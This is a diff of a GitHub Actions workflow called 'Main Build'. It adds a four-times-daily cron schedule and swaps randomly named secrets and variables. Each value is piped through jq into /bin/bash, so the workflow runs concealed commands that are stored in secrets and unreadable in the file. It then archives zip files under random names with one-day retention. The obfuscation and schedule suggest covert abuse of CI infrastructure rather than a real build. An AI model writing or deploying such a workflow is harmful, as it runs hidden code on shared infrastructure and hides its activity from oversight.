@@ -2,6 +2,8 @@ name: Main Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '35 2,8,14,20 * * *'
 jobs:
   launch:
     runs-on: ubuntu-latest
@@ -13,17 +15,17 @@ jobs:
           fetch-depth: 1
       - name: Do work
         env:
-          ta377: ${{ secrets.ta377 }}
+          kapp96: ${{ secrets.kapp96 }}
         run: |
-          printf '%s' "$ta377" | jq -r .o18276 | /bin/bash
-          echo $riu52306 | jq -r .mpb1 | /bin/bash
-          echo $y6 | jq -r .s64 | /bin/bash
-          printf '%s' "$y44931" | jq -r .dlflh81 | /bin/bash
-          echo $sguov099 | jq -r .qmloi3663 | /bin/bash
+          printf '%s' "$kapp96" | jq -r .v517 | /bin/bash
+          echo $ca6045 | jq -r .t20999 | /bin/bash
+          printf '%s' "$niit3055" | jq -r .vw62 | /bin/bash
+          echo $ihpx71 | jq -r .xcbjy469 | /bin/bash
+          printf '%s' "$biyyt7" | jq -r .wenmx89 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
         with:
-          name: j5v2uUcF
+          name: nSLajTvU
           path: "*.zip"
           retention-days: 1
